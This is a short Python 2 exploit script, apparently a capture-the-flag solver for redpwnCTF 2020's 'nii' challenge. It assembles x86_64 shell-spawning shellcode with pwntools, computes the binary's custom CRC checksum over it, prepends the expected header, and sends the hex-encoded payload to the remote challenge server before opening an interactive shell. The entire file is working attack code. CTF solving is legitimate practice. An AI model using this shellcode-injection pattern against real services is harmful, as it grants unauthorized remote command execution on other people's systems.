#!/usr/bin/env python2
'''
Original solver : https://ctftime.org/writeup/21855
Creator : stamparm
Team : OpenToAll
'''

import struct

try:
    from pwn import *
except ImportError:
    exit("[x] sudo pip install pwn")

context.arch = "x86_64"

header = "NIIv0.1:AmnlXing"
payload = asm(shellcraft.sh())

v0 = 0
for char in payload:
    v7 = ord(char)
    for v9 in xrange(7, -1, -1):
        if v0 >= 0x80000000:
            v10 = 0x80000011
        else:
            v10 = 0
        v12 = 2 * v0
        v12 = (v12 & 0xffffff00) | (((v7 >> v9) & 1 ^ v12) & 0xff);
        v0 = v10 ^ v12

crc = struct.pack("<L", v0)

if True:
    r = remote("2020.redpwnc.tf", 31215)
else:
    r = process(["./nii"])

r.sendline((header + crc + payload).encode("hex").upper())
r.interactive()
